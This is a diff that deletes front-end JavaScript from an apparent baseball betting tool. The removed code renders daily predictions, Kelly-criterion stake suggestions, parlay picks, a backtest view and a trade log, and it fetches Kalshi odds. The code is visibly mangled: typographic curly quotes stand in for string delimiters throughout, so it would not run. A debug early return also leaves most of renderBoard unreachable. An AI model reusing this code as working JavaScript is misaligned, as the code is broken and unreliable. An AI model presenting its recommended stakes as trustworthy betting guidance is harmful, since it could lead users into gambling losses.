-document.querySelectorAll(’.tab’).forEach(function(t,i){t.classList.toggle(‘active’,i===n);});
-document.querySelectorAll(’.panel’).forEach(function(p,i){p.classList.toggle(‘active’,i===n);});
-if(n===0)renderBoard();
-if(n===1)renderDetail();
-if(n===2)renderPlays();
-if(n===3)renderBacktest();
-if(n===4)renderTradeLog();
-}
-
-// – TAB 0: DAILY BOARD ––––––––––––––––––––––––––––
-function renderBoard(){
-var el = document.getElementById(‘tab0’);
-if (!el) { alert(‘ERROR: tab0 not found’); return; }
-var msg = ‘JS WORKS! Date: ’ + S.date + ’ | Bank: ’ + S.bankroll;
-if (S.error) msg += ’ | ERROR: ’ + S.error;
-el.innerHTML = ‘<div style="color:#5aba8a;font-size:14px;font-weight:700;padding:16px;border:2px solid #5aba8a;margin:10px;border-radius:8px">’ + msg + ‘</div>’;
-return;
-var html=’<div class="card">’;
-html+=’<div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">’;
-html+=’<input type="date" id="date-in" value="'+S.date+'" style="flex:1 1 140px;font-size:14px">’;
-html+=’<div style="display:flex;align-items:center;gap:6px;flex:1 1 130px"><span style="font-size:11px;color:#6a5a3a;white-space:nowrap">Bankroll $</span><input type="number" id="bank-in" value="'+S.bankroll+'" min="100" style="flex:1;font-size:14px"></div>’;
-html+=’<button id=“analyze-btn” onclick=“doAnalyze()” ‘+(S.loading?‘disabled’:’’)+’ style=“padding:9px 18px;border-radius:6px;border:none;background:’+(S.loading?’#2e2416’:‘linear-gradient(135deg,#c8922a,#9a6e18)’)+’;color:’+(S.loading?’#6a5a3a’:’#080600’)+’;font-weight:900;font-size:12px;letter-spacing:2px;text-transform:uppercase;cursor:’+(S.loading?‘not-allowed’:‘pointer’)+’;display:flex;align-items:center;gap:8px;white-space:nowrap”>’;
-if(S.loading)html+=’<span class="spin"></span>’;
-html+=(S.loading?‘Analyzing…’:‘Analyze All’)+’</button></div>’;
-if(S.loading)html+=’<div style="margin-top:10px;font-size:11px;color:#6a5a3a;display:flex;gap:8px;align-items:center"><span class="spin"></span>’+S.progress+’</div>’;
-html+=’</div>’;
-if(S.error)html+=’<div class="error-box">’+S.error+’</div>’;
-if(S.results.length){
-html+=’<div class="card">’;
-html+=’<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px">’;
-html+=’<div class="lbl" style="margin-bottom:0">’+S.results.length+’ Games \u2014 ‘+S.date+’</div>’;
-html+=’<button onclick="doAutoFill()" style="padding:6px 14px;border-radius:6px;border:1px solid #3a5a3a;background:rgba(90,186,138,0.1);color:#5aba8a;font-size:11px;font-weight:700;cursor:pointer">\u26a1 Auto-fill Kalshi Odds</button>’;
-html+=’</div>’;
-S.results.slice().sort(function(a,b){return b.winnerP-a.winnerP;}).forEach(function(r,i){
-var bml=S.bookOdds[r.gamePk]||null;
-var e=bml?edge(r.winnerP,bml):null;
-html+=’<div class="game-row">’;
-html+=’<div onclick="viewGame(\''+r.gamePk+'\')" style="cursor:pointer">’;
-html+=’<div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap">’;
-html+=’<div style="flex:1"><span style="font-size:13px;font-weight:700;color:#e0b040">’+r.winner+’</span><span style="font-size:11px;color:#6a5a3a;margin:0 6px">def.</span><span style="font-size:13px;color:#555">’+(r.winner===r.aName?r.bName:r.aName)+’</span></div>’;
-html+=’<div style="display:flex;gap:8px;align-items:center"><span style="font-size:12px;font-family:monospace;color:'+(r.winnerML[0]==='+'?'#5aba8a':'#c8b890')+';font-weight:700">’+r.winnerML+’</span><span style="font-size:11px;color:#c8b890">’+(r.winnerP*100).toFixed(0)+’%</span><span style="font-size:10px;font-weight:700;color:'+confCol(r.confidence)+'">’+r.confidence+’</span></div></div>’;
-html+=’<div style="margin-top:3px;font-size:10px;color:#6a5a3a">’+r.time+’ \xb7 O/U ‘+r.ou+’</div></div>’;
-html+=’<div style="display:flex;align-items:center;gap:8px;margin-top:8px" onclick="event.stopPropagation()">’;
-html+=’<span style="font-size:9px;color:#2e2416;white-space:nowrap">Book ML:</span>’;
-html+=’<input type="text" placeholder="+110" value="'+(bml||'')+'" data-gpk="'+r.gamePk+'" onclick="event.stopPropagation()" oninput="setBookOdd(this)" style="width:64px;border-color:'+(bml?'#3a5a3a':'#2e2416')+';color:'+(bml?'#5aba8a':'#6a5a3a')+';font-size:11px;padding:3px 6px;text-align:center">’;
-if(e!==null)html+=’<span style="font-size:10px;font-weight:700;font-family:monospace;color:'+(e>=0.05?'#5aba8a':e>=0.02?'#8aba5a':e>=0?'#c0c060':'#c06060')+'">’+(e>=0?’+’:’’)+(e*100).toFixed(1)+’%</span>’;
-html+=’</div></div>’;
-});
-html+=’</div>’;
-}
-document.getElementById(‘tab0’).innerHTML=html;
-var di=document.getElementById(‘date-in’);if(di)di.onchange=function(){sSet(‘date’,this.value);S.results=[];S.parlays=null;renderBoard();};
-var bi=document.getElementById(‘bank-in’);if(bi)bi.onchange=function(){sSet(‘bankroll’,parseFloat(this.value)||1000);};
-}
-function setBookOdd(el){var gpk=el.getAttribute(‘data-gpk’);S.bookOdds[gpk]=el.value;lsSet(‘dm-bookodds’,S.bookOdds);}
-function viewGame(gpk){var r=S.results.find(function(x){return x.gamePk==gpk;});if(r){S.detail=r;showTab(1);}}
-function viewLegDetail(li,gpk){var r=S.results.find(function(x){return x.gamePk==gpk;});if(r){S.detail=r;showTab(1);}}
-function doAnalyze(){
-S.loading=true;S.error=’’;S.results=[];S.parlays=null;S.progress=‘Loading schedule…’;renderBoard();
-fetchGames(S.date).then(function(gameList){
-if(!gameList.length){S.error=‘No games found for ‘+S.date;S.loading=false;renderBoard();return;}
-S.progress=‘Analyzing ‘+gameList.length+’ games…’;renderBoard();
-var analyzed=[],i=0;
-function next(){
-if(i>=gameList.length){S.loading=false;S.results=analyzed;S.parlays=buildParlays(analyzed,S.bookOdds,S.minEdge);renderBoard();return;}
-var batch=gameList.slice(i,i+3);i+=3;
-S.progress=‘Analyzed ‘+Math.min(i,gameList.length)+’/’+gameList.length+’…’;renderBoard();
-Promise.allSettled(batch.map(function(g){return analyzeGame(g,S.date);})).then(function(res){
-res.forEach(function(r){if(r.status===‘fulfilled’)analyzed.push(r.value);});
-next();
-});
-}
-next();
-}).catch(function(e){S.error=‘Error: ‘+e.message;S.loading=false;renderBoard();});
-}
-function doAutoFill(){
-var btn=document.querySelector(’[onclick=“doAutoFill()”]’);
-if(btn){btn.textContent=‘Fetching Kalshi…’;btn.disabled=true;}
-fetchKalshiOdds(S.results).then(function(odds){
-var filled=0;
-Object.keys(odds).forEach(function(gpk){if(odds[gpk]){S.bookOdds[gpk]=odds[gpk];filled++;}});
-lsSet(‘dm-bookodds’,S.bookOdds);
-if(filled>0){S.parlays=buildParlays(S.results,S.bookOdds,S.minEdge);alert(‘Filled ‘+filled+’ Kalshi lines!’);}
-else alert(‘No Kalshi markets matched. Try manually entering odds.’);
-renderBoard();
-});
-}
-
-// – TAB 1: GAME DETAIL ––––––––––––––––––––––––––––
-function renderDetail(){
-var r=S.detail;
-if(!r){document.getElementById(‘tab1’).innerHTML=’<div class="card" style="text-align:center;padding:32px"><div style="font-size:32px;margin-bottom:10px">🔍</div><div style="color:#6a5a3a">Select a game from Daily Board.</div></div>’;return;}
-var bml=S.bookOdds[r.gamePk]||null;
-var eml=bml||r.winnerML;
-var e=bml?edge(r.winnerP,bml):null;
-var k=bml?kelly(r.winnerP,bml)*100:0;
-var stake=bml?(k/100*S.bankroll).toFixed(2):’–’;
-var win=bml?((mlDec(bml)-1)*(k/100*S.bankroll)).toFixed(2):’–’;
-var html=’’;
-if(r.venue||r.weather)html+=’<div style="margin-bottom:12px;padding:8px 14px;background:rgba(255,255,255,.02);border:1px solid #252015;border-radius:8px;display:flex;gap:12px;flex-wrap:wrap">’+(r.venue?’<span style="font-size:11px;color:#6a5a3a">🏝 ‘+r.venue+’</span>’:’’)+(r.weather?’<span style="font-size:11px;color:#3a4a2a">🌡 ‘+r.weather+’</span>’:’’)+’<span style="font-size:11px;color:#2a3a2a">Park ‘+r.parkB+’</span></div>’;
-html+=’<div class="card"><div style="display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;margin-bottom:18px">’;
-html+=’<div><div style="font-size:17px;font-family:Georgia,serif;font-weight:900;color:'+(r.winner===r.aName?'#e0b040':'#555')+'">’+r.aName+’</div><div style="font-size:9px;color:'+(r.winner===r.aName?'#c8922a':'#333')+';text-transform:uppercase;letter-spacing:2px;margin-top:2px">’+(r.winner===r.aName?‘PREDICTED WINNER’:‘UNDERDOG’)+’</div><div style="font-size:10px;color:#4a3a1a;margin-top:3px">SP: ‘+r.aPitcher+’</div></div>’;
-html+=’<div style="text-align:center"><div style="font-size:9px;color:#2e2416;letter-spacing:4px">VS</div><div style="font-size:12px;color:#555;font-family:monospace;margin-top:3px">’+r.projScore+’</div></div>’;
-html+=’<div style="text-align:right"><div style="font-size:17px;font-family:Georgia,serif;font-weight:900;color:'+(r.winner===r.bName?'#e0b040':'#555')+'">’+r.bName+’</div><div style="font-size:9px;color:'+(r.winner===r.bName?'#c8922a':'#333')+';text-transform:uppercase;letter-spacing:2px;margin-top:2px">’+(r.winner===r.bName?‘PREDICTED WINNER’:‘UNDERDOG’)+’</div><div style="font-size:10px;color:#3a3a4a;margin-top:3px">SP: ‘+r.bPitcher+’</div></div>’;
-html+=’</div>’+winBar(r.pctA,r.pctB)+’</div>’;
-html+=’<div class="card"><div class="lbl">Full-Game Pitching</div><div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">’+pitchBox(r.aName,r.aBlend,r.aPitcher)+pitchBox(r.bName,r.bBlend,r.bPitcher)+’</div></div>’;
-html+=’<div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">’;
-html+=’<div class="chip '+(r.winner===r.aName?'gold':'')+'"><div class="cl">’+r.aName.split(’ ‘).pop()+’ ML</div><div class="cv">’+r.mlA+’</div></div>’;
-html+=’<div class="chip '+(r.winner===r.bName?'gold':'')+'"><div class="cl">’+r.bName.split(’ ‘).pop()+’ ML</div><div class="cv">’+r.mlB+’</div></div>’;
-html+=’<div class="chip"><div class="cl">O/U</div><div class="cv">’+r.ou+’</div></div>’;
-html+=’<div class="chip '+(r.confidence==='High'?'gold':'')+'"><div class="cl">Confidence</div><div class="cv">’+r.confidence+’</div></div></div>’;
-html+=’<div class="card"><div class="lbl">Factor Breakdown</div>’;
-r.factors.forEach(function(f){html+=factorRow(f);});
-html+=’</div>’;
-html+=’<div class="card"><div class="lbl" style="color:#5aba8a">Kelly Stake</div>’;
-if(!bml){
-html+=’<div style="background:rgba(200,146,42,.05);border:1px solid #2e2416;border-radius:8px;padding:14px;text-align:center"><div style="font-size:13px;color:#6a5a3a;margin-bottom:6px">Enter Book ML to calculate stake</div><div style="font-size:11px;color:#2e2416;line-height:1.6">Go to Daily Board, find this game, and enter the Kalshi/sportsbook moneyline for ‘+r.winner+’ in the Book ML field.</div></div>’;
-}else{
-html+=’<div class="kelly-grid">’;
-html+=’<div class="kelly-box" style="background:rgba(58,138,90,.06);border:1px solid #3a8a5a"><div style="font-size:9px;color:#6a5a3a;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px">Recommended</div><div style="font-size:22px;font-weight:900;font-family:monospace;color:#5aba8a">$’+stake+’</div><div style="font-size:10px;color:#6a5a3a;margin-top:2px">’+k.toFixed(1)+’% of $’+S.bankroll+’</div>’+(e!==null?’<div style="margin-top:4px">’+edgeBadge(e)+’</div>’:’’)+’</div>’;
-html+=’<div class="kelly-box" style="background:rgba(255,255,255,.02);border:1px solid #2e2416"><div style="font-size:9px;color:#6a5a3a;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px">If Win</div><div style="font-size:22px;font-weight:900;font-family:monospace;color:#c8922a">+$’+win+’</div><div style="font-size:10px;color:#6a5a3a;margin-top:2px">’+r.winner+’ \xb7 ‘+bml+’</div><div style="font-size:10px;color:#2e2416;margin-top:1px">’+(r.winnerP*100).toFixed(1)+’% model</div></div>’;
-html+=’</div>’;
-html+=’<button onclick="quickLog()" style="width:100%;margin-top:10px;padding:9px;border-radius:6px;border:1px solid #c8922a;background:rgba(200,146,42,.08);color:#e0b040;font-weight:700;font-size:12px;cursor:pointer">📋 Log This Trade</button>’;
-}
-html+=’</div>’;
-document.getElementById(‘tab1’).innerHTML=html;
-}
-function quickLog(){
-if(!S.detail)return;
-var r=S.detail,bml=S.bookOdds[r.gamePk]||’’;
-var stake=bml?(kelly(r.winnerP,bml)*S.bankroll).toFixed(0):’’;
-var trades=loadTrades();
-trades.unshift({id:Date.now(),date:S.date,team:r.winner,opponent:r.winner===r.aName?r.bName:r.aName,confidence:r.confidence,modelP:(r.winnerP*100).toFixed(1),modelML:r.winnerML,bookML:bml,edgePct:bml?(edge(r.winnerP,bml)*100).toFixed(1):’’,stake:stake,result:‘pending’,pnl:’’});
-saveTrades(trades);
-alert(‘Trade logged! Go to Trade Log to mark result.’);
-}
-
-// – TAB 2: BEST PLAYS ———————————————————
-function renderPlays(){
-var html=’<div class="card" style="margin-bottom:14px"><div class="lbl" style="color:#5aba8a">Value Filter</div>’;
-html+=’<div style="font-size:11px;color:#4a5a3a;line-height:1.7;margin-bottom:10px">Enter book odds in Daily Board. Only plays where model beats book implied probability are shown.</div>’;
-html+=’<div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap"><div style="flex:1"><div style="font-size:9px;color:#2e2416;letter-spacing:2px;margin-bottom:4px">MIN EDGE</div><div style="display:flex;gap:6px">’;
-[1,2,3,5].forEach(function(pct){html+=’<button onclick="setMinEdge('+pct+')" style="padding:5px 12px;border-radius:4px;border:1px solid '+(S.minEdge===pct?'#5aba8a':'#252015')+';background:'+(S.minEdge===pct?'rgba(90,186,138,.12)':'transparent')+';color:'+(S.minEdge===pct?'#5aba8a':'#6a5a3a')+';font-size:11px;cursor:pointer;font-family:monospace">’+pct+’%+</button>’;});
-html+=’</div></div><button onclick="rebuildPlays()" style="padding:8px 16px;border-radius:6px;border:none;background:linear-gradient(135deg,#3a8a5a,#2a6a4a);color:#080600;font-weight:900;font-size:12px;letter-spacing:2px;text-transform:uppercase;cursor:pointer">Rebuild</button></div>’;
-if(S.parlays)html+=’<div style="margin-top:8px;font-size:10px;color:#2e2416">’+(Object.values(S.bookOdds).filter(Boolean).length>0?Object.values(S.bookOdds).filter(Boolean).length+’ book lines \xb7 ‘+S.parlays.edgeFiltered+’ pass filter’:‘No book odds entered \u2014 showing all High/Medium plays.’)+’</div>’;
-html+=’</div>’;
-if(!S.parlays){html+=’<div class="card" style="text-align:center;padding:32px"><div style="font-size:32px;margin-bottom:10px">🎯</div><div style="color:#6a5a3a;margin-bottom:16px">Run Analyze All Games first.</div><button onclick="showTab(0)" style="padding:9px 20px;border-radius:6px;border:1px solid #c8922a;background:transparent;color:#c8922a;font-size:12px;cursor:pointer">Go to Daily Board</button></div>’;
-}else{
-if(S.parlays.singles.length){html+=’<div style="font-size:10px;letter-spacing:3px;color:#c8922a;text-transform:uppercase;margin-bottom:8px">Best Singles</div>’;S.parlays.singles.forEach(function(p){html+=parlayCardHTML(p);});}
-if(S.parlays.parlays2.length){html+=’<div style="font-size:10px;letter-spacing:3px;color:#5a9ac0;text-transform:uppercase;margin-bottom:8px;margin-top:16px">2-Leg Parlays</div>’;S.parlays.parlays2.forEach(function(p){html+=parlayCardHTML(p);});}
-if(S.parlays.parlays3.length){html+=’<div style="font-size:10px;letter-spacing:3px;color:#9a5ac0;text-transform:uppercase;margin-bottom:8px;margin-top:16px">3-Leg Parlay</div>’;S.parlays.parlays3.forEach(function(p){html+=parlayCardHTML(p);});}
-if(!S.parlays.singles.length)html+=’<div class="card" style="text-align:center;padding:24px"><div style="color:#6a5a3a">No qualifying plays. Lower edge threshold or enter book odds.</div></div>’;
-html+=’<div style="margin-top:20px;padding:12px 14px;background:rgba(138,58,58,.06);border:1px solid #3a1a1a;border-radius:8px"><div style="font-size:10px;color:#6a3a3a;line-height:1.7">For entertainment only. Not financial advice.</div></div>’;
-}
-document.getElementById(‘tab2’).innerHTML=html;
-}
-function setMinEdge(n){sSet(‘minEdge’,n);renderPlays();}
-function rebuildPlays(){if(S.results.length)S.parlays=buildParlays(S.results,S.bookOdds,S.minEdge);renderPlays();}
-
-// – TAB 3: SEASON RECORD ——————————————————
-function renderBacktest(){
-var html=’<div class="card" style="margin-bottom:14px"><div class="lbl">Backtest Range</div>’;
-html+=’<div style="font-size:10px;color:#4a4a2a;margin-bottom:10px;line-height:1.6">Uses current season stats. Best with 2-4 week ranges within April-October.</div>’;
-html+=’<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end">’;
-html+=’<div style="flex:1 1 120px"><div style="font-size:9px;color:#2e2416;letter-spacing:2px;margin-bottom:3px">FROM</div><input type="date" id="bt-start" value="'+S.btStart+'" style="width:100%;font-size:13px"></div>’;
-html+=’<div style="flex:1 1 120px"><div style="font-size:9px;color:#2e2416;letter-spacing:2px;margin-bottom:3px">TO</div><input type="date" id="bt-end" value="'+S.btEnd+'" style="width:100%;font-size:13px"></div>’;
-html+=’<button id=“bt-btn” onclick=“doBacktest()” ‘+(S.btLoading?‘disabled’:’’)+’ style=“padding:9px 16px;border-radius:6px;border:none;background:’+(S.btLoading?’#2e2416’:‘linear-gradient(135deg,#c8922a,#9a6e18)’)+’;color:’+(S.btLoading?’#6a5a3a’:’#080600’)+’;font-weight:900;font-size:12px;letter-spacing:2px;text-transform:uppercase;cursor:’+(S.btLoading?‘not-allowed’:‘pointer’)+’;display:flex;align-items:center;gap:8px”>’;
-if(S.btLoading)html+=’<span class="spin"></span>’;
-html+=(S.btLoading?‘Running…’:‘Run Backtest’)+’</button></div>’;
-if(S.btLoading)html+=’<div style="margin-top:10px;font-size:11px;color:#6a5a3a;display:flex;gap:8px;align-items:center"><span class="spin"></span>’+S.btProgress+’</div>’;
-html+=’</div>’;
-if(S.btError)html+=’<div class="error-box">’+S.btError+’</div>’;
-if(S.btResults){
-var bt=S.btResults;
-html+=’<div style="font-size:10px;letter-spacing:3px;color:#c8922a;text-transform:uppercase;margin-bottom:8px">Individual Game Accuracy</div>’;
-html+=’<div class="card"><div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px;margin-bottom:10px">’;
-[[‘Overall’,bt.all,’#c8b890’],[‘High’,bt.high,’#c8922a’],[‘Medium’,bt.medium,’#8a8a3a’],[‘Low’,bt.low,’#6a5a3a’]].forEach(function(item){html+=’<div style="background:rgba(255,255,255,.02);border:1px solid #2e2416;border-radius:8px;padding:10px 6px;text-align:center"><div style="font-size:9px;color:#2e2416;letter-spacing:2px;text-transform:uppercase;margin-bottom:4px">’+item[0]+’</div><div style="font-size:18px;font-weight:900;font-family:monospace;color:'+item[2]+'">’+(item[1].pct!==null?item[1].pct+’%’:’\u2014’)+’</div><div style="font-size:10px;color:#6a5a3a;margin-top:2px">’+item[1].w+’-’+item[1].l+’</div></div>’;});
-html+=’</div><div class="lbl">Calibration</div>’;
-bt.calibration.forEach(function(b){
-if(!b.games)return;
-var actual=parseFloat(b.actualPct),mid=(b.lo+Math.min(b.hi,0.75))/2*100,diff=actual-mid;
-var col=Math.abs(diff)<5?’#5aba8a’:Math.abs(diff)<10?’#8a8a3a’:’#c06060’;
-html+=’<div class="cal-row"><span style="font-size:10px;color:#6a5a3a;width:55px;flex-shrink:0">’+b.label+’</span><span style="font-size:10px;color:#2e2416;width:48px;flex-shrink:0">’+b.games+’ games</span><div style="flex:1;height:5px;background:#2e2416;border-radius:2px;overflow:hidden"><div style="height:100%;width:'+(b.actualPct||0)+'%;background:#5a9ac0;border-radius:2px"></div></div><span style="font-size:11px;font-family:monospace;color:#5a9ac0;width:38px;text-align:right;flex-shrink:0">’+b.actualPct+’%</span><span style="font-size:10px;font-family:monospace;color:'+col+';width:40px;text-align:right;flex-shrink:0">’+(diff>0?’+’:’’)+diff.toFixed(1)+’</span></div>’;
-});
-html+=’</div>’;
-html+=’<div style="font-size:10px;letter-spacing:3px;color:#5a9ac0;text-transform:uppercase;margin-bottom:8px">Day-by-Day Parlay Record</div>’;
-html+=’<div class="card" style="margin-bottom:12px"><div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px">’;
-[[‘Single’,bt.p1Record,’#c8922a’,bt.p1Roi],[‘2-Leg’,bt.p2Record,’#5a9ac0’,bt.p2Roi],[‘3-Leg’,bt.p3Record,’#9a5ac0’,bt.p3Roi]].forEach(function(item){html+=’<div style="background:rgba(255,255,255,.02);border:1px solid '+item[2]+'44;border-radius:8px;padding:10px 8px;text-align:center"><div style="font-size:9px;color:'+item[2]+';letter-spacing:2px;text-transform:uppercase;margin-bottom:4px">’+item[0]+’</div><div style="font-size:18px;font-weight:900;font-family:monospace;color:'+(item[1].pct!==null&&parseFloat(item[1].pct)>50?'#5aba8a':'#c06060')+'">’+(item[1].pct!==null?item[1].pct+’%’:’\u2014’)+’</div><div style="font-size:10px;color:#6a5a3a;margin-top:2px">’+item[1].w+’-’+item[1].l+’</div><div style="font-size:10px;font-family:monospace;color:'+(parseFloat(item[3])>=0?'#5aba8a':'#c06060')+';margin-top:4px">ROI ‘+item[3]+’%</div></div>’;});
-html+=’</div><div class="lbl">Parlay Log</div><div style="max-height:360px;overflow-y:auto">’;
-bt.parlayDays.slice().reverse().forEach(function(day){
-if(!day.single&&!day.parlay2&&!day.parlay3)return;
-html+=’<div style="background:rgba(255,255,255,.02);border:1px solid #2e2416;border-radius:7px;padding:8px 10px;margin-bottom:5px"><div style="font-size:10px;color:#6a5a3a;font-family:monospace;margin-bottom:6px;font-weight:700">’+day.date+’</div>’;
-[[‘single’,‘1-Leg’,’#c8922a’],[‘parlay2’,‘2-Leg’,’#5a9ac0’],[‘parlay3’,‘3-Leg’,’#9a5ac0’]].forEach(function(item){
-var p=day[item[0]];if(!p)return;
-html+=’<div style="display:flex;align-items:center;gap:8px;padding:4px 8px;background:'+(p.hit?'rgba(58,138,90,.07)':'rgba(138,58,58,.07)')+';border-radius:4px;border:1px solid '+(p.hit?'#1a3a2a':'#3a1a1a')+';margin-bottom:3px"><span style="font-size:9px;font-weight:700;color:'+item[2]+';width:32px;flex-shrink:0">’+item[1]+’</span><span style="font-size:10px;color:'+(p.hit?'#e0b040':'#777')+';flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">’+p.label+’</span><span style="font-size:10px;color:'+(p.hit?'#5aba8a':'#c06060')+';flex-shrink:0">’+(p.hit?‘HIT’:‘MISS’)+’</span></div>’;
-});
-html+=’</div>’;
-});
-html+=’</div></div>’;
-html+=’<div class="card"><div class="lbl">Game Log (’+bt.bets.length+’ games)</div><div style="max-height:300px;overflow-y:auto">’;
-bt.bets.slice().reverse().forEach(function(r){
-html+=’<div class="bt-row" style="background:'+(r.correct?'rgba(58,138,90,.06)':'rgba(138,58,58,.06)')+';border:1px solid '+(r.correct?'#1a3a2a':'#3a1a1a')+'"><span style="font-size:9px;color:#2e2416;width:70px;flex-shrink:0;font-family:monospace">’+r.date+’</span><span style="font-size:10px;color:'+(r.correct?'#e0b040':'#888')+';flex:1;font-weight:'+(r.correct?700:400)+'">’+r.winner+’</span><span style="font-size:9px;color:'+(r.correct?'#3a6a3a':'#6a3a3a')+';flex-shrink:0">’+(r.correct?’\u2713’:’\u2717’)+’ ‘+(r.actualWinner?r.actualWinner.split(’ ‘).pop():’’)+’</span><span style="font-size:10px;font-family:monospace;color:'+(r.winnerML&&r.winnerML[0]==='+'?'#5aba8a':'#c8b890')+';width:40px;text-align:right;flex-shrink:0">’+r.winnerML+’</span><span style="font-size:9px;color:'+confCol(r.confidence)+';width:34px;text-align:right;flex-shrink:0">’+r.confidence+’</span></div>’;
-});
-html+=’</div></div>’;
-}
-document.getElementById(‘tab3’).innerHTML=html;
-var bs=document.getElementById(‘bt-start’);if(bs)bs.onchange=function(){sSet(‘btStart’,this.value);};
-var be=document.getElementById(‘bt-end’);if(be)be.onchange=function(){sSet(‘btEnd’,this.value);};
-}
-function doBacktest(){
-S.btLoading=true;S.btError=’’;S.btResults=null;S.btProgress=‘Fetching completed games…’;renderBacktest();
-var yr=S.btEnd.slice(0,4);
-fetchCompleted(S.btStart,S.btEnd).then(function(games){
-if(!games.length){S.btError=‘No games found. Try a range within April-October.’;S.btLoading=false;renderBacktest();return;}
-var analyzed=[],errors=0,i=0;
-S.btProgress=‘Found ‘+games.length+’ games. Analyzing…’;renderBacktest();
-function next(){
-if(i>=games.length){
-S.btLoading=false;S.btProgress=’’;
-if(!analyzed.length){S.btError=‘0/’+games.length+’ analyzed (’+errors+’ failed). Try a shorter range.’;renderBacktest();return;}
-try{S.btResults=computeBacktest(analyzed,S.bankroll);}catch(e){S.btError=‘Compute error: ‘+e.message;renderBacktest();return;}
-setTimeout(function(){renderBacktest();},100);return;
-}
-var batch=games.slice(i,i+2);i+=2;
-S.btProgress=‘Analyzing ‘+Math.min(i,games.length)+’/’+games.length+’ \u2014 ‘+analyzed.length+’ ok, ‘+errors+’ failed’;
-renderBacktest();
-Promise.allSettled(batch.map(function(g){return analyzeGameCached(g,yr);})).then(function(res){
-res.forEach(function(r){if(r.status===‘fulfilled’)analyzed.push(r.value);else errors++;});
-setTimeout(next,100);
-}).catch(function(){errors+=batch.length;setTimeout(next,100);});
-}
-setTimeout(next,200);
-}).catch(function(e){S.btError=’Fetch failed: ’+e.message;S.btLoading=false;renderBacktest();});
-}
-
-// – TAB 4: TRADE LOG ———————————————————
-function renderTradeLog(){
-var trades=loadTrades();
-var settled=trades.filter(function(t){return t.result===‘win’||t.result===‘loss’;});
-var wins=settled.filter(function(t){return t.result===‘win’;});
-var totalPnl=settled.reduce(function(s,t){return s+(parseFloat(t.pnl)||0);},0);
-var totalStake=settled.reduce(function(s,t){return s+(parseFloat(t.stake)||0);},0);
-var pending=trades.filter(function(t){return t.result===‘pending’;}).length;
-var html=’<div class="card" style="margin-bottom:12px">’;
-html+=’<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px"><div class="lbl" style="margin-bottom:0">Trade Log</div>’;
-html+=’<div style="display:flex;gap:8px"><button onclick="exportCSV()" style="padding:5px 12px;border-radius:5px;border:1px solid #252015;background:transparent;color:#6a5a3a;font-size:11px;cursor:pointer">Export CSV</button>’;
-html+=’<button onclick="showLogForm()" style="padding:5px 12px;border-radius:5px;border:none;background:linear-gradient(135deg,#c8922a,#9a6e18);color:#080600;font-size:11px;font-weight:700;cursor:pointer">+ Log Trade</button></div></div>’;
-html+=’<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px">’;
-var pct=settled.length?(wins.length/settled.length*100).toFixed(1):null;
-var roi=totalStake?(totalPnl/totalStake*100).toFixed(1):null;
-[[‘Record’,settled.length?wins.length+’-’+(settled.length-wins.length):’\u2014’,null],[‘Win %’,pct?pct+’%’:’\u2014’,pct&&parseFloat(pct)>55],[‘P&L’,settled.length?(totalPnl>=0?’+’:’’)+totalPnl.toFixed(2):’\u2014’,totalPnl>=0],[‘ROI’,roi?roi+’%’:’\u2014’,roi&&parseFloat(roi)>=0]].forEach(function(item){
-var col=item[2]===true?’#5aba8a’:item[2]===false&&item[1]!==’\u2014’?’#c06060’:’#6a5a3a’;
-if(item[1]===’\u2014’)col=’#6a5a3a’;
-html+=’<div style="background:rgba(255,255,255,.02);border:1px solid #2e2416;border-radius:7px;padding:8px 6px;text-align:center"><div style="font-size:9px;color:#6a5a3a;letter-spacing:2px;text-transform:uppercase;margin-bottom:3px">’+item[0]+’</div><div style="font-size:15px;font-weight:900;font-family:monospace;color:'+col+'">’+item[1]+’</div></div>’;
-});
-html+=’</div>’;
-if(pending>0)html+=’<div style="margin-top:8px;font-size:10px;color:#6a5a3a">’+pending+’ pending \u2014 tap WIN/LOSS to mark result</div>’;
-html+=’</div>’;
-html+=’<div id="log-form" style="display:none" class="card"><div class="lbl">Log New Trade</div>’;
-html+=’<div style="display:flex;flex-direction:column;gap:8px">’;
-if(S.results.length){
-html+=’<div><div style="font-size:9px;color:#2e2416;letter-spacing:2px;margin-bottom:4px">PICK FROM TODAY</div>’;
-html+=’<select id="lt-game" style="width:100%;font-size:13px;padding:9px 10px;background:#0a0907;border:1px solid #252015;border-radius:6px;color:#c8b890;outline:none"><option value="">Select game…</option>’;
-S.results.forEach(function(r,i){html+=’<option value="'+i+'">’+r.winner+’ vs ‘+(r.winner===r.aName?r.bName:r.aName)+’ (’+r.confidence+’ ‘+(r.winnerP*100).toFixed(0)+’%)</option>’;});
-html+=’</select></div>’;
-}
-html+=’<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px">’;
-html+=’<div><div style="font-size:9px;color:#2e2416;letter-spacing:2px;margin-bottom:3px">BOOK ML</div><input id="lt-ml" type="text" placeholder="-150" style="width:100%;font-size:12px;padding:8px 10px;background:#0a0907;border:1px solid #252015;border-radius:6px;color:#c8b890;outline:none;font-family:monospace"></div>’;
-html+=’<div><div style="font-size:9px;color:#2e2416;letter-spacing:2px;margin-bottom:3px">STAKE $</div><input id="lt-stake" type="number" placeholder="25" style="width:100%;font-size:12px;padding:8px 10px;background:#0a0907;border:1px solid #252015;border-radius:6px;color:#c8b890;outline:none"></div>’;
-html+=’<div><div style="font-size:9px;color:#2e2416;letter-spacing:2px;margin-bottom:3px">DATE</div><input id="lt-date" type="date" value="'+S.date+'" style="width:100%;font-size:12px;padding:8px 10px;background:#0a0907;border:1px solid #252015;border-radius:6px;color:#c8b890;outline:none"></div>’;
-html+=’</div>’;
